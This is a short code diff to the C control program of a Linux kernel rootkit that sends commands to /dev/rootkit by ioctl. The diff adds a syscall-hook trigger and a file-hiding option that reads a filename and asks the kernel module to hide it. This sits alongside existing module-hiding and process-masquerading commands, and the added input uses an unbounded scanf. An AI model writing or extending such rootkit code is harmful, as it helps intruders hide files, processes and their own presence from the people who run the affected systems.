@@ -3,12 +3,14 @@
 #include <sys/ioctl.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include "rootkit.h"
 
 int main()
 {
 	int fd;
 	int choice;
+	struct hided_file hided_file;
 	struct masq_proc_req req;
 
 	fd = open("/dev/rootkit", O_RDWR);
@@ -27,6 +29,7 @@ int main()
 
 		switch (choice) {
 		case 1:
+			ioctl(fd, IOCTL_MOD_HOOK);
 			break;
 		case 2:
 			ioctl(fd, IOCTL_MOD_HIDE);
@@ -42,6 +45,10 @@ int main()
 			ioctl(fd, IOCTL_MOD_MASQ, &req);
 			break;
 		case 4:
+			printf("Please enter the filename that you want to hide\n");
+			scanf("%s", hided_file.name);
+			hided_file.len = strlen(hided_file.name);
+			ioctl(fd, IOCTL_FILE_HIDE, &hided_file);
 			break;
 		default:
 			printf("Please enter a valid command\n");
